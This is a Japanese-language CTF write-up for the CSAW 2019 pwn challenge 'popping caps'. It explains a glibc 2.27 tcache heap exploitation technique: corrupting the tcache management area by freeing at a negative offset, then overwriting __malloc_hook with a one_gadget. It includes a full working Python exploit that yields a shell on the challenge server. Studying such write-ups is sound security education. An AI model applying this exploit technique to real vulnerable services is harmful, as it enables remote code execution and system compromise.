# [pwn 200pts] popping caps - CSAW CTF Qualification 2019
64ビットバイナリで、RELRO以外有効です。
```
$ checksec -f popping_caps
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols     Yes      0               6       popping_caps
```
libcは2.27でmallocやfree, writeが自由にできます。freeするとポインタにはNULLが入りますが、double free用の別のポインタは残ったままです。また、開始時にsystem関数のアドレスが渡されます。一見簡単ですが、操作は全部で7回までしかできません。
```
malloc-->free-->free-->malloc-->write-->malloc-->malloc-->write
```
で任意のアドレスの値を書き換えられるので、1回足りません。終了時にmallocが呼ばれるので、`__malloc_hook`を書き換えれば良いでしょう。
また、freeする際は今持っているアドレスから好きなオフセットを足した場所をfreeできます。
tcacheの管理領域はheapの先頭にあるので、負のオフセットを渡してここをいじれば良さそうです。0x3b0〜0x3c0のサイズの領域をfreeするとカウンタが上がるのでサイズ0x10〜0x20のリンクの直前に0x100ができます。これをチャンクサイズとして`malloc(0xa8)`などすればtcacheのリンクを直接変更できます。

```python
from ptrlib import *

def malloc(size):
    sock.sendlineafter(": \n", "1")
    sock.sendlineafter(": \n", str(size))
    return

def free(ofs):
    sock.sendlineafter(": \n", "2")
    sock.sendlineafter(": \n", str(ofs))
    return

def write(data):
    sock.sendlineafter(": \n", "3")
    sock.sendafter(": \n", data)
    return

libc = ELF("./libc.so.6")
#sock = Process("./popping_caps")
sock = Socket("pwn.chal.csaw.io", 1001)

one_gadget = 0x10a38c

# leak libc
sock.recvuntil("system ")
addr_system = int(sock.recvline(), 16)
libc_base = addr_system - libc.symbol("system")
logger.info("libc base = " + hex(libc_base))

malloc(0x3a8)
free(0)
free(-0x210)

malloc(0xf8)
write(p64(libc_base + libc.symbol("__malloc_hook")))

malloc(0x18)
write(p64(libc_base + one_gadget))

sock.interactive()
```

# 感想
珍しいタイプの問題ですね。
